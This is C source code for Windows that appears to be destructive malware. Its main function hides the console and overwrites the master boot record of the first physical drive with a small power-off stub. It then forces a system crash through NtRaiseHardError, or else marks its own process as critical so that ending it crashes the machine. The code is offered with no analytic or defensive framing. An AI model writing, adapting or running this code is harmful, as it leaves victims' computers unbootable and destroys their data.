#include <stdio.h>
#include <Windows.h>
#include <Tlhelp32.h>
#define ProcessBreakOnTermination 29

typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength);

void EnableDebugPriv()
{
    HANDLE hToken;

    LUID sedebugnameValue;

    TOKEN_PRIVILEGES tkp;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue);

    tkp.PrivilegeCount = 1;

    tkp.Privileges[0].Luid = sedebugnameValue;

    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, false, &tkp, sizeof tkp, NULL, NULL);

    CloseHandle(hToken);
}

BOOL CallNtSetInformationProcess(HANDLE hProcess, ULONG Flag)
{
    _NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
    if (!NtSetInformationProcess)
    {
        return 0;
    }
    if (NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)ProcessBreakOnTermination, &Flag, sizeof(ULONG)) < 0)
        return 0;
    return 1;
}
void bsod()
{
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000000, 0, 0, 0, 6, &tmp2);
	}
	else {
        EnableDebugPriv();
        CallNtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()), TRUE);
	}
}
void main()
{
    FreeConsole();
    unsigned char data[512] = {
	0xB8, 0x01, 0x53, 0x31, 0xDB, 0xCD, 0x15, 0xB8, 0x0E, 0x53, 0x31, 0xDB, 0xB9, 0x02, 0x01, 0xCD,
	0x15, 0xB8, 0x07, 0x53, 0xBB, 0x01, 0x00, 0xB9, 0x03, 0x00, 0xCD, 0x15
	};
	data[510] = 0x55;
	data[511] = 0xAA;
	FILE *drive;
	drive = fopen("\\\\.\\PhysicalDrive0", "rb+");
	fwrite(data,512,1,drive);
	fclose(drive);
	bsod();
}